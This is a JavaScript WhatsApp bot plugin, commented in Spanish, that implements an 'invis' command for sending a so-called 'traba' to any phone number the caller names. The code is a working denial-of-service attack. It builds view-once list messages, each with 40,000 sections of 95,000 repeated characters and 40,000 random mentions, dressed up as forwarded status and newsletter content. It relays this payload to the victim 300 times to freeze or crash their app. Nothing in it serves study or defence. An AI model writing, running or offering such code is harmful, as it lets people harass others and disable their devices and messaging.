import fetch from 'node-fetch';

// 🔹 Función de traba invisible
async function XaDelayMaker(target, conn) {
  const delaymention = Array.from({ length: 40000 }, (_, r) => ({
    title: "ꦾ".repeat(95000),
    rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
  }));

  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "Hola",
          listType: 2,
          buttonText: null,
          sections: delaymention,
          singleSelectReply: { selectedRowId: "🔴" },
          contextInfo: {
            mentionedJid: Array.from({ length: 40000 }, () =>
              "1" + Math.floor(Math.random() * 700000) + "@s.whatsapp.net"
            ),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "333333333333@newsletter",
              serverMessageId: 1,
              newsletterName: "-"
            }
          },
          description: "te afecto?"
        }
      }
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2
    }
  };

  await conn.relayMessage(target, MSG, {});
}

// 🔹 Comando principal
let handler = async (m, { conn, text }) => {
  let target;

  // Si hay texto o número
  if (text) {
    const jidx = text.replace(/[^0-9]/g, "");
    if (jidx.startsWith("0")) return m.reply("⚠️ No uses números que empiecen en 0. Usa el código de país.");
    target = `${jidx}@s.whatsapp.net`;
  }
  // Si hay respuesta
  else if (m.quoted) {
    target = m.quoted.sender;
  }
  // Si no hay nada, usar al mismo que ejecutó
  else {
    target = m.sender;
  }

  await m.reply(`✅ Traba enviada a: *${target}*\n⏳ Esto puede tardar unos segundos...`);

  await conn.sendMessage(m.chat, {
    audio: { url: 'https://files.catbox.moe/4c2kje.mp3' },
    mimetype: 'audio/mpeg',
    ptt: true
  }, { quoted: m });

  for (let i = 0; i < 50; i++) {
    await XaDelayMaker(target, conn);
    await XaDelayMaker(target, conn);
    await XaDelayMaker(target, conn);
    await XaDelayMaker(target, conn);
    await XaDelayMaker(target, conn);
    await XaDelayMaker(target, conn);
  }

  console.log('✅ Traba invisctt completada');
};

handler.command = ['invis'];
handler.help = ['invis <número>'];
handler.tags = ['traba'];
handler.group = false;
handler.premium = false;

export default handler;